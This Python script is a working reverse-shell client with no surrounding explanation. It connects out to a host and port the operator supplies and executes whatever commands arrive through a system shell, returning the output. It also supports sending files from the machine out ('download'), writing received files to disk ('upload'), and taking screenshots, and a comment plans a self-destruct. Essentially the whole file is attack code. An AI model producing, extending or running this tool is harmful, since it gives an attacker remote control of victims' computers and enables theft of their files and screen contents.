import os
import socket
import subprocess
import pyscreenshot as cam

s = socket.socket()
host = input(("Host: "))
port = int(input("Port: "))
s.connect((host, port))

BYTES = 10000000

n = 1

while True:
		data = s.recv(BYTES)
		# if first 2 characters are cd, change dir to next characters
		# note the :2 is before and the 3: is after
		if data[:2].decode("utf-8") == "cd":
			try:
				os.chdir(data[3:].decode("utf-8"))
			except FileNotFoundError as e:
				e = str(e)
				s.send(e.encode() + "\n".encode())
				continue
		elif data.decode("utf-8") == "download":
			try:
				file_path = s.recv(BYTES)
				file_path = file_path.decode()
				file = open(file_path, "rb")
				contents = file.read()
				while contents:
					s.send(contents)
					contents = file.read(BYTES)
				file.close()
				print("File sent succesfully")
				s.send('complete'.encode())
			except FileNotFoundError:
				s.send("[i] File not found".encode())
		elif data.decode("utf-8") == "upload":
			path = s.recv(BYTES)
			print("recieved path as: " + str(path.decode()))
			#file = s.recv(BYTES)
			#file = file.decode()
			f = open(path, "wb")
			print("Opening file")
			file = s.recv(BYTES)
			print("recieving 'file'")
			while not ('complete' in str(file)):
				f.write(file)
				print("writing file")
				file = s.recv(BYTES)
				print("recieving file")
			f.close()
			print("closing file")
		elif data.decode("utf-8") == "screenshot":
			img = cam.grab()
			name = 'shot' + str(n) + '.png'
			img.save(name)
			n = n + 1
		
		## For cd to work, this has to be enabled as a seperate statement instead of an else or a elif
		if len(data) > 0:
			cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			output_bytes = cmd.stdout.read() + cmd.stderr.read()
			output_str = str(output_bytes, "utf-8")
			s.send(str.encode(output_str + str(os.getcwd()) + ' $ '))

## TODO: Self destruct when closed

# Close the connection

s.close()
